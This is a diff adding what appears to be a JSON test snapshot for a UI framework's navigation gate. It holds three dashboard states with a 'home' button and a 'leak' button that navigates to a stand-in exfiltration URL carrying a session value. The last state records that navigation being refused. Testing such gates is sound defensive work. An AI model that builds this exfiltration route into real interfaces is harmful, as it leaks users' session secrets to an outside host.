@@ -1,0 +1,20 @@
+[
+  {
+    "tree": {"accessibility":{"role":"main"},"id":"root","kind":{"$type":"Box","children":[{"accessibility":{"role":"button"},"id":"home","kind":{"$type":"Button","label":"home","onClick":{"$type":"Navigate","route":"/orders"},"variant":"Secondary"}},{"accessibility":{"role":"button"},"id":"leak","kind":{"$type":"Button","label":"leak","onClick":{"$type":"Navigate","route":"https://exfil.example/collect?session=secret"},"variant":"Secondary"}},{"id":"readout","kind":{"$type":"Markdown","text":"init"}}],"layout":{"$type":"Auto"},"role":"Dashboard"}},
+    "effects": [],
+    "refused": false,
+    "denials": []
+  },
+  {
+    "tree": {"accessibility":{"role":"main"},"id":"root","kind":{"$type":"Box","children":[{"accessibility":{"role":"button"},"id":"home","kind":{"$type":"Button","label":"home","onClick":{"$type":"Navigate","route":"/orders"},"variant":"Secondary"}},{"accessibility":{"role":"button"},"id":"leak","kind":{"$type":"Button","label":"leak","onClick":{"$type":"Navigate","route":"https://exfil.example/collect?session=secret"},"variant":"Secondary"}},{"id":"readout","kind":{"$type":"Markdown","text":"init"}}],"layout":{"$type":"Auto"},"role":"Dashboard"}},
+    "effects": ["{\"kind\":\"Navigate\",\"route\":\"/orders\"}"],
+    "refused": false,
+    "denials": []
+  },
+  {
+    "tree": {"accessibility":{"role":"main"},"id":"root","kind":{"$type":"Box","children":[{"accessibility":{"role":"button"},"id":"home","kind":{"$type":"Button","label":"home","onClick":{"$type":"Navigate","route":"/orders"},"variant":"Secondary"}},{"accessibility":{"role":"button"},"id":"leak","kind":{"$type":"Button","label":"leak","onClick":{"$type":"Navigate","route":"https://exfil.example/collect?session=secret"},"variant":"Secondary"}},{"id":"readout","kind":{"$type":"Markdown","text":"init"}}],"layout":{"$type":"Auto"},"role":"Dashboard"}},
+    "effects": ["{\"kind\":\"Navigate\",\"route\":\"https://exfil.example/collect?session=secret\"}"],
+    "refused": false,
+    "denials": [{"$type":"GateRefused","capability":"Navigate","origin":"exfil.example"}]
+  }
+]
